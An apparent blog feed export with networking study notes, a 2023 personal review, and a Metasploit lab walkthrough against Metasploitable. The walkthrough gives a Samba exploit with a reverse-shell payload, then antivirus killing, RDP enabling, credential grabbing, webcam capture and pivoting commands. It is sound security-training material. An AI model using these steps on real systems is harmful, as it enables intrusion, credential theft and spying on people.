href="#同步传输与异步传输" class="headerlink" title="同步传输与异步传输"></a>同步传输与异步传输</h3><ol><li>  区分：发送方与接收方是否根据相同的时钟信号预先同步</li></ol><h4 id="同步传输"><a href="#同步传输" class="headerlink" title="同步传输"></a>同步传输</h4><ol><li>  同步传输的数据发送与数据传输是在一个<strong>共同的时钟信号下</strong>进行的，发送方与接收方的时钟信号是同步的。</li><li>  他们按照相同的时间基准来操作</li><li>  发送数据之前，发送方与接收方根据相同的时钟信号预先协商和同步，要求严格的时钟同步</li></ol><h4 id="异步通信"><a href="#异步通信" class="headerlink" title="异步通信"></a>异步通信</h4><ol><li>  异步通信中，数据的发送与接收<strong>不需要共同的时钟信号来同步</strong></li><li>  每个数据单元都包含数据传输的起始与终止位</li><li>  将比特分成小组进行传送</li><li>  每次异步传输的信息都以一个起始位开头，通知接收方数据已经到达了，给接收方响应、接收和缓存数据的时间</li><li>  在传输结束时，一个停止位标识此次传输的终止</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240405231221.png"></li></ol><h3 id="单工、半双工、全双工"><a href="#单工、半双工、全双工" class="headerlink" title="单工、半双工、全双工"></a>单工、半双工、全双工</h3><ol><li>  单工通信中，数据只能在一个方向上进行传输</li><li>  其中一个设备只能发送数据，另一个设备只能接收数据，数据只能沿一个方向流动</li><li>  广播电台：收音机只能收，广播站只能广播发送信号</li><li>  半双工通信：数据可以在两个方向上传输，但是不能同时发送和接收，无线对讲机</li><li>  全双工通信：数据可以在两个方向上同时传输，电话通信</li></ol><h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><ol><li>  <strong>不改变信号性质</strong>的前提下，仅对数字基带信号的<strong>波形</strong>进行变换，称为编码 </li><li>  来自信源的信号称为基带信号</li><li>  把数字基带信号的频率范围，搬移到较高的频段，并转换为模拟信号，称为调制</li><li>  计算机输出的各种文字、图像数据信号包含较多的低频分量，甚至有直流分量，许多信号不能传输低频分量和直流分量，必须进行调制</li><li>  编码是将数字基带信号只对波形进行变换，仍然是基带信号，在数字信道中</li><li>  调制是将数字基带信号转为模拟信道中</li></ol><h3 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h3><ol><li>  在<strong>使用时间域的波形</strong>（一段时间内的波形）表示<strong>数字信号</strong>，<strong>代表不同离散数值</strong>的基本<strong>波形称为码元</strong></li><li>  <strong>一段时间域内，代表不同离散数值的波形称为码元</strong></li><li>  使用二进制编码时，只有两种不同的码元，一种代表0，一种代表1</li></ol><h3 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406154212.png"></li><li>  不归零编码：码元信号永远不会是零电平，正电平代表1，负电平代表0，但是需要控制时钟信号的控制线，在计算机网络中，宁可用数据线而不是控制线</li><li>  归零编码：正脉冲代表1，负脉冲代表0；每个码元信号传输结束后都要归为零电平，相当于把时钟信号用归零方式编码在了数据之内</li><li>  曼彻斯特编码：码元中间时刻的跳变既表示时钟，又表示数据；码元周期中心的向上跳变代表0，码元周期中心的向下跳变代表1</li><li>  差分曼彻斯特编码：跳变仅代表时钟，码元的开始处电平是否发生变化表示数据；周期的中心始终都有跳变，周期的开始有跳变代表0，周期开始边界没有跳变代表1</li></ol><h3 id="基本调制方法"><a href="#基本调制方法" class="headerlink" title="基本调制方法"></a>基本调制方法</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406160204.png"></li><li>  调制：数字基带信号-&gt;模拟信号</li><li>  调幅：载波的<strong>振幅</strong>随基带数字信号而变化</li><li>  调频：载波的<strong>频率</strong>随数字信号而变化</li><li>  调相：载波的<strong>初始相位</strong>随基带数字信号而变化</li><li>  正交振幅调制QAM Quadrature Amplitude Modulation：振幅与相位混合调制方法</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406161435.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406161510.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406161712.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406161803.png"></li></ol><h3 id="信道的极限容量"><a href="#信道的极限容量" class="headerlink" title="信道的极限容量"></a>信道的极限容量</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406162417.png"></li><li>  为什么控制信道的传输速度：传输速度过快会导致失真</li><li>  为了<strong>避免码间串扰</strong>，码元传输速率是有上限的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240406163215.png"></li><li>  波特率：码元的传输速率，即一秒内传输多少个码元</li><li>  要提高信息的传输速率，必须设法使每一个码元携带更多比特的信息量，采用多元制</li></ol><h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="应用层概述"><a href="#应用层概述" class="headerlink" title="应用层概述"></a>应用层概述</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240402213722.png"></li><li>  其它层解决的问题：</li><li>  物理层：使用何种信号来传输比特</li><li>  数据链路层：解决分组在一个网络或一段链路上传输的问题</li><li>  网络层：解决分组在多个网络上传输（路由）问题</li><li>  运输层：解决进程之间基于网络的通信问题</li><li>  应用层：解决通过应用进程之间交互来实现特定网络应用的问题</li></ol><h2 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240402203429.png"></p></li><li><p>  工作原理：</p></li><li><p>  控制连接始终保持，数据连接在数据传输结束后即断开</p></li><li><p>  控制连接使用21端口，不变</p></li><li><p>是否使用TCP 20端口建立数据连接与传输方式有关</p>  <pre class="line-numbers language-none"><code class="language-none">1. 主动方式使用TCP 20端口2. 被动方式使用TCP端口 &gt; 1024,由服务器和客户端自行协商决定3. 系统端口端口号大于1024<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240402203805.png"></p></li><li><p>  FTP可以传输ASCII模式的文本；也可以传输二进制文件的数据</p></li></ol><h2 id="客户-服务器模式-C-S"><a href="#客户-服务器模式-C-S" class="headerlink" title="客户/服务器模式(C/S)"></a>客户/服务器模式(C/S)</h2><ol><li>  客户是服务请求方，服务器是服务提供方</li><li>  服务器总是处于运行状态，等待客户的服务请求</li><li>  服务器主机具有固定的IP地址</li></ol><h2 id="对等方式（P2P）"><a href="#对等方式（P2P）" class="headerlink" title="对等方式（P2P）"></a>对等方式（P2P）</h2><ol><li>  P2P方式中，没有固定的服务请求者和服务提供者</li><li>  分布在服务边缘各端系统中的应用进程，是对等的，被称为对等方</li><li>  对等方相互之间直接通信</li><li>  每个<strong>对等方</strong>既是<strong>服务的请求者</strong>，也是<strong>服务的提供者</strong></li><li>  P2P应用是服务分散型的，分布在大量的对等计算机中</li><li>  <strong>可拓展性</strong>：系统每增加一个对等方，<strong>不仅增加的是服务的请求者，也是服务的提供者</strong>，<strong>系统性能不会因为规模的增大而降低</strong></li></ol><h2 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h2><ol><li><p>  DHCP：Dynamic动态 Host主机 Configuration配置 Protocol协议</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240402213337.png"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240402213411.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit实战</title>
      <link href="/Metasploit%E5%AE%9E%E6%88%98/"/>
      <url>/Metasploit%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit实战"><a href="#Metasploit实战" class="headerlink" title="Metasploit实战"></a>Metasploit实战</h1><h2 id="靶机选择"><a href="#靶机选择" class="headerlink" title="靶机选择"></a>靶机选择</h2><ol><li>  本次我选择的是<a href="https://sourceforge.net/projects/metasploitable/files/latest/download">Download Metasploitable (sourceforge.net)</a> Metasploitable靶机</li><li>  使用vmware进行挂载</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319162235.png"></li></ol><h2 id="渗透测试过程"><a href="#渗透测试过程" class="headerlink" title="渗透测试过程"></a>渗透测试过程</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ol><li><p>  因为使用vmware在本地进行挂载，所以需要先找到目标靶机的IP</p></li><li><p>  先在kali中使用ifconfig查找到eth0的IP地址</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319162408.png"></p></li><li><p>对该地址进行C端地址扫描，nmap -sP 查找存活主机</p>  <pre class="line-numbers language-none"><code class="language-none">nmap -sP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319162451.png"></p></li><li><p>  因为kali是134,目标靶机是在kali开启后进行挂载的，可以直接判断为地址要大于134</p></li><li><p>对剩余的地址进行nmap -sV，查看目标靶机开启的服务</p>  <pre class="line-numbers language-none"><code class="language-none">nmap -sV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319162630.png"></p></li><li><p>  看到有Samba smbd 3.X - 4.X服务在运行，SMB是在局域网上共享文件和打印机的通信协议，在局域网内使用Linux和Windows系统的机器之间提供文件和打印机等资源的共享服务</p></li></ol><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li><p>进入msf，使用如下命令进行Samba漏洞利用模块的扫描</p>  <pre class="line-numbers language-none"><code class="language-none">seasearch samba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319163138.png"></p></li><li><p>  分别查看rank一列的漏洞，其中excellent为漏洞最容易利用成功的（时间最新的）</p></li><li><p>查看漏洞详细信息</p>  <pre class="line-numbers language-none"><code class="language-none">info + 漏洞名称info exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319210756.png"></p></li><li><p>输入如下 use 命令使用漏洞利用模块：</p>  <pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  可以看到metasploit命令提示符更改为msf exploit(具体攻击载荷名称)</p></li><li><p>因为目标是Linux机器，所以一定要采用Linux的攻击载荷，使用如下命令可以查看具体攻击载荷列表</p>  <pre class="line-numbers language-none"><code class="language-none">show payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319211117.png"></p></li><li><p>使用set命令选择payload、攻击IP地址、利用端口号、攻击IP地址</p>  <pre class="line-numbers language-none"><code class="language-none">set PAYLOAD cmd&#x2F;unix&#x2F;reverse  这里是反向攻击载荷模块set RHOST xxx.xxx.xxx.xxx 被攻击主机IP地址set RPORT xxx 利用端口号set LHOST xxx.xxx.xxx.xxx 设置攻击主机IP地址show options 查看参数是否已经设置正确<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319212012.png"></p></li><li><p>  成功拿下</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319213334.png"></p></li><li><p>  攻击成功后，在攻击机和目标机之间会建立一个Shell连接，渗透Windows及其它操作系统的过程类似，只是选择的Payload和漏洞利用模块不同</p></li><li><p>  使用一些命令可以查看目标机的信息</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319213611.png"></p></li></ol><h2 id="后渗透攻击——信息搜集"><a href="#后渗透攻击——信息搜集" class="headerlink" title="后渗透攻击——信息搜集"></a>后渗透攻击——信息搜集</h2><h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><ol><li>  Meterpreter是Metasploit的后渗透工具，可以在被攻击的进程内工作，不需要创建新的进程，且易于在多个进程之间迁移</li></ol><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><ol><li><p>  刚获得Meterpreter Shell时，该Shell是极其脆弱和易受攻击的</p></li><li><p>  例如攻击者利用浏览器漏洞攻陷目标机器，但是攻击渗透后浏览器可能被用户关闭</p></li><li><p>  所以第一步是移动这个Shell，将它和目标及中的某一个稳定的进程绑在一起</p></li><li><p>  不需要对磁盘进行任何写入操作，例如写马可能被杀</p></li><li><p>使用如下命令获取目标机正在运行的进程</p>  <pre class="line-numbers language-none"><code class="language-none">ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319214407.png"></p></li><li><p>使用如下命令查看Metapreter的进程号</p>  <pre class="line-numbers language-none"><code class="language-none">getpid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  麻了，没有getpid工具，但是有gcc，自己写！</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319214825.png"></p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> idp<span class="token punctuation">,</span>id<span class="token punctuation">;</span>    idp <span class="token operator">=</span> <span class="token function">getppid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ppid= %d\n"</span><span class="token punctuation">,</span>idp<span class="token punctuation">)</span><span class="token punctuation">;</span>    id <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pid= %d\n"</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="10"><li>  google了一下，也可以使用下面的命令</li></ol><pre><code> <pre class="line-numbers language-none"><code class="language-none">echo $$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></code></pre><ol start="11"><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240319215624.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320082353.png"></p></li><li><p>  使用migrate将shell移动到稳定进程中</p></li><li><p>  进程完成迁移后，原先PID下的Shell会自动关闭</p></li><li><p>  如果没有自动关闭，需要用kill手动杀死进程</p></li></ol><h3 id="普通shell如何进入meterpreter"><a href="#普通shell如何进入meterpreter" class="headerlink" title="普通shell如何进入meterpreter"></a>普通shell如何进入meterpreter</h3><ol><li><p>使用如下命令将shell放在后台</p>  <pre class="line-numbers language-none"><code class="language-none">background<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进入刚刚的session会话</p>  <pre class="line-numbers language-none"><code class="language-none">sessions -u &lt;编号&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看新生成的session编号</p>  <pre class="line-numbers language-none"><code class="language-none">sessions -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进入新的meterpreter session</p>  <pre class="line-numbers language-none"><code class="language-none">sessions -i 新的session编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><ol><li>  获得了稳定的进程后，接下来收集目标机的系统信息</li></ol><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h4><ol><li><p>输入如下命令查看目标机的系统信息</p>  <pre class="line-numbers language-none"><code class="language-none">sysinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320090832.png"></p></li></ol><h4 id="查看是否运行在虚拟机上"><a href="#查看是否运行在虚拟机上" class="headerlink" title="查看是否运行在虚拟机上"></a>查看是否运行在虚拟机上</h4><ol><li><p>输入如下命令查看目标机是否运行在虚拟机上</p>  <pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;checkvm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320090951.png"></p></li></ol><h4 id="查看是否在运行"><a href="#查看是否在运行" class="headerlink" title="查看是否在运行"></a>查看是否在运行</h4><ol><li><p>检查目标机是否正在运行</p>  <pre class="line-numbers language-none"><code class="language-none">idletime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  emmmm,靶机系统架构不允许</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320091051.png"></p></li></ol><h4 id="查看目标机完整的网络设置"><a href="#查看目标机完整的网络设置" class="headerlink" title="查看目标机完整的网络设置"></a>查看目标机完整的网络设置</h4><ol><li><p>输入如下命令查看目标机完整的网络设置</p>  <pre class="line-numbers language-none"><code class="language-none">route<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320091159.png"></p></li></ol><h4 id="会话放后台"><a href="#会话放后台" class="headerlink" title="会话放后台"></a>会话放后台</h4><ol><li><p>除此之外，可以将会话放到后台，此命令适合在多个Meterpreter会话的场景下使用</p>  <pre class="line-numbers language-none"><code class="language-none">background<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="查看已成功渗透的用户名"><a href="#查看已成功渗透的用户名" class="headerlink" title="查看已成功渗透的用户名"></a>查看已成功渗透的用户名</h4><ol><li><p>输入如下命令查看当前目标机上已经渗透成功的用户名</p>  <pre class="line-numbers language-none"><code class="language-none">getuid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320091345.png"></p></li></ol><h4 id="关闭系统杀毒软件"><a href="#关闭系统杀毒软件" class="headerlink" title="关闭系统杀毒软件"></a>关闭系统杀毒软件</h4><ol><li><p>关闭目标机系统杀毒软件</p>  <pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320091510.png"></p></li></ol><h4 id="启动远程桌面协议"><a href="#启动远程桌面协议" class="headerlink" title="启动远程桌面协议"></a>启动远程桌面协议</h4><ol><li><p>启动目标机远程桌面协议，也就是3389端口</p>  <pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320091634.png"></p></li></ol><h4 id="查看目标机本地子网情况，添加路由，改为跳板"><a href="#查看目标机本地子网情况，添加路由，改为跳板" class="headerlink" title="查看目标机本地子网情况，添加路由，改为跳板"></a>查看目标机本地子网情况，添加路由，改为跳板</h4><ol><li><p>查看目标机本地子网情况</p>  <pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;autoroute<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  先将meterpreter隐藏在后台，使用background命令</p></li><li><p>  然后输入route add命令添加路由，添加成功后输入route命令进行查看,注意命令格式</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320092448.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320092529.png"></p></li><li><p>  这时一条路由就被添加到已攻陷主机的路由表中了，可以借助被攻陷主机对其它网络进行攻击（跳板）</p></li></ol><h4 id="查看当前有多少用户登录目标机"><a href="#查看当前有多少用户登录目标机" class="headerlink" title="查看当前有多少用户登录目标机"></a>查看当前有多少用户登录目标机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列举安装在目标机上的应用程序"><a href="#列举安装在目标机上的应用程序" class="headerlink" title="列举安装在目标机上的应用程序"></a>列举安装在目标机上的应用程序</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320093310.png"></li></ol><h4 id="抓取自动登录的用户名和密码"><a href="#抓取自动登录的用户名和密码" class="headerlink" title="抓取自动登录的用户名和密码"></a>抓取自动登录的用户名和密码</h4><ol><li><p>用户如果将计算机设置为自动登录，如下命令可以抓取自动登录的用户名和密码</p>  <pre class="line-numbers language-none"><code class="language-none">run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320093453.png"></p></li><li><p>  如果没有抓到任何信息，就需要用到拓展插件Espia,先输入load espia命令加载此插件，然后输入screengrab命令抓取此时目标机的屏幕截图（仅限于Windows系统）</p></li></ol><h4 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h4><ol><li><p>查看目标机是否有摄像头的命令如下</p>  <pre class="line-numbers language-none"><code class="language-none">webcam_list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>输入如下命令打开摄像头，拍一张照片</p>  <pre class="line-numbers language-none"><code class="language-none">webcam_snap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开启直播模式</p>  <pre class="line-numbers language-none"><code class="language-none">webcam_stream<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="进入目标机的Shell"><a href="#进入目标机的Shell" class="headerlink" title="进入目标机的Shell"></a>进入目标机的Shell</h4><ol><li><p>输入如下命令进入目标机的Shell下面</p>  <pre class="line-numbers language-none"><code class="language-none">shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240320094017.png"></p></li><li><p>  当meterpreter的命令前缀消失时，即进入了shell，退出了meterpreter</p></li></ol><h3 id="后渗透攻击——权限提升"><a href="#后渗透攻击——权限提升" class="headerlink" title="后渗透攻击——权限提升"></a>后渗透攻击——权限提升</h3><ol><li>  通常，进入时只获得了一个guest或者普通User权限，在实施横向渗透攻击和提权攻击时将会很困难</li><li>  需要将权限由Guest-&gt;User-&gt;Administrator-&gt;System</li><li>  渗透的最终目的是获取服务器的最高权限</li></ol><h4 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h4><ol><li>  纵向提权：低权限角色获取高权限角色的权限</li><li>  横向提权：获取同级别角色的权限</li></ol><h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><ol><li>  输入shell命令进入目标机的CMD命令行</li><li>  输入whoami/groups命令查看现在的权限</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023复盘</title>
      <link href="/2023%E5%A4%8D%E7%9B%98/"/>
      <url>/2023%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="2023复盘"><a href="#2023复盘" class="headerlink" title="2023复盘"></a>2023复盘</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>  2023年很曲折，经历了很多挫折，有很多不愉快的事情，但是也有一些高光时刻</li><li>  在竞赛和项目中认识了很多老师和行业大牛，我认为这将是非常重要的资源</li><li>  竞赛中小有成就，拿到了四个国奖和若干个省奖</li><li>  第一年搬出宿舍校外住宿，算了算一年的科创奖金差不多可以完全承担一年的房租，还有剩余</li><li>  全国各地到处跑，见识到了大千世界</li></ol><h2 id="开发项目"><a href="#开发项目" class="headerlink" title="开发项目"></a>开发项目</h2><ol><li><p>  “先有开发，后有安全”</p></li><li><p>  和一起打了将近两年CTF的队友一起组队搞开发，彼此之间配合还算比较好，没有出现推诿扯皮之类的意外情况，这次项目经历也算进一步巩固了我们之间的关系</p></li><li><p>  很荣幸能够认识刘老师，我们在开发过程中遇到的一些解决不了的问题经常会请教他，他总是能够给出一些超出我们知识范围的想法，不会直接教给我们，而是让我们自己想办法去实现，我感觉这很好，很锻炼发现问题、提出问题、分析问题、解决问题的能力</p></li><li><p>  最后的结果还是比较满意的，这些开发项目拿到了中国大学生计算机设计大赛国家级二等奖一项、国家级三等奖一项、省奖若干，中国大学生服务外包创新创业大赛区域赛三等奖、中国机器人及人工智能大赛山东赛区三等奖，这个寒假打算去申请专利和软著</p></li><li><p>  中国大学生服务外包创新创业大赛和中国机器人及人工智能大赛是命题赛，给出项目的所有需求，需要全部实现</p></li><li><p>  中国大学生计算机设计大赛是非命题赛，我们实现了很多天马行空的想法（符合正常业务的天马行空的想法，嘿嘿…）</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/dc02787f5892893228b41ab4b74e9e2.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/553204a7793e2ed1f2efdcc463fe03d.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/96e69e033a2100648d0a17b3c7e13aa.jpg"></p></li><li><p>  我们做的最好的项目是一个CV项目，拿到了中国大学生计算机设计大赛国二，具体实现功能如下</p></li></ol><h3 id="具体功能"><a href="#具体功能" class="headerlink" title="具体功能"></a>具体功能</h3><ol><li>  支持边缘防护、明火烟雾检测、围栏翻越检测、挥手/抽烟/跌倒的行为检测、积水及渗漏水检测等校园安全相关场景:</li></ol><pre><code>针对不同的校园安全问题，算法端整理与搜寻相应的图片与视频资料，大部分图片与视频为多行为资料。针对这些资料，通过人工标注方法标注数据集，从而使得模型能够通过对不同状况的对比检测准确检测出指定目标。对于数据集的训练，使用基于BoTNet神经网络的优化yolov5算法进行多轮训练，首先通过对通用数据集进行训练得到上游模型，再通过对监控录像数据集进行下游训练得到最终模型，该方法能够有效提高模型在学校场所的适用性。</code></pre><ol start="2"><li>  对于围栏翻越检测、边缘防护等需要设定检测区域的场景支持良好的交互配置方式:</li></ol><pre><code>针对围栏翻越检测、边缘防护等需要设定检测区域的检测任务，项目允许用户针对围栏区域与边缘防护区域在对应摄像头的交互界面进行针对性标记，并选择对应的检测模块进行检测，同时支持用户自定义检测置信度。这样的交互配置方式能够让用户更加方便地对特定区域进行针对性标记，并且根据实际需求选择对应的检测模块，从而提高检测的准确率。此外，支持用户自定义检测置信度也能够让用户更加灵活地控制检测结果的输出，进一步提高检测的可靠性和可用性。</code></pre><ol start="3"><li>  在系统中对于所识别的事件在列表中进行展示，需要包含告警事件所产生的区域、时间、内容及所记录的摄像头；点击查看按钮可以查看事件的详细内容，包括视频及图片数据；支持按不同属性筛选事件:</li></ol><pre><code>前端的控制台页面通过对视频流进行实时播放，实现了管理人员可以实时检测当前任意摄像头的实时状况，同时在控制台页面也可以实时显示报警的信息，包括报警的图片，报警的位置，报警的类型，写有专门的接口实时的推送公众号进行处理。</code></pre><ol start="4"><li>  